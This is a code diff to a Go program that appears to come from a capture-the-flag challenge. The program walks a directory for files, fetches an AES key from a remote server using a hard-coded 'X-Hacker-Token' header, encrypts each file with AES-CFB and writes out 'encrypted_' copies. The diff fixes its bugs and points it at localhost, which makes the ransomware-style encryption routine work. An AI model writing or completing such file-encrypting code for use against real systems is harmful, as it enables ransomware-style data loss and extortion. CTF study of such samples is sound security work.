@@ -6,15 +6,16 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"encoding/json"
-	"fmt"
 	"io"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
+	"strings"
 )
 
 type receivedtoken struct {
-	token string
+	Token string
 }
 
 func Decryptkey(data string) string {
@@ -44,20 +45,37 @@ func EncryptFile(file string) {
 	}
 
 	client := http.Client{}
-	req, _ := http.NewRequest("POST", "http://chal.ctf.uahcyber.club:5502", nil)
-	req.Header.Set("X-Hacker-Token", "jo7aiXieShaephaevi4Ohvengiey0kah")
-	req.Form.Add("file", file)
-	res, err := client.Do(req)
 
+	form := url.Values{}
+	form.Add("file", file)
+	req, _ := http.NewRequest("POST", "http://localhost:5000/api/get_signing_key", strings.NewReader(form.Encode()))
+	//req, _ := http.NewRequest("POST", "http://chal.ctf.uahcyber.club:5502", nil)
+	req.Header.Set("X-Hacker-Token", "jo7aiXieShaephaevi4Ohvengiey0kah")
+	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+	res, err := client.Do(req)
 	if err != nil {
 		return 
 	}
-	encoded_key := receivedtoken{}
-	json.NewDecoder(res.Body).Decode(encoded_key)
-	decoded_key := Decryptkey(encoded_key.token)
-	fmt.Println(decoded_key)
 
-	block, err := aes.NewCipher([]byte(decoded_key))
+	defer res.Body.Close()
+	body, _ := io.ReadAll(res.Body)
+
+	var decoded receivedtoken
+	err = json.Unmarshal(body, &decoded)
+	if err != nil {
+		panic(err)
+	}
+
+	if decoded.Token == "" {
+		panic("Token was empty")
+	}
+
+	decoded_key := Decryptkey(decoded.Token)
+
+	block, err := aes.NewCipher([]byte(decoded_key)[:16])
+	if err != nil {
+		panic(err)
+	}
 	ct := make([]byte, aes.BlockSize+len(bytes))
 	iv := ct[:aes.BlockSize]
 
@@ -65,7 +83,13 @@ func EncryptFile(file string) {
 	stream := cipher.NewCFBEncrypter(block, iv)
 	stream.XORKeyStream(ct[aes.BlockSize:], bytes)
 
-	f, _ := os.Create("encrypted_"+file)
+	path := strings.Split(file, "/")
+	path[len(path)-1] = "encrypted_"+path[len(path)-1]
+	file = strings.Join(path, "/")
+	f, err := os.Create(file)
+	if err != nil {
+		panic(err)
+	}
 	f.Write(ct)
 	return
 }
@@ -81,6 +105,5 @@ func Findfiles() []string {
 		}
 		return nil
 	})
-	fmt.Println(files)
 	return files
 }
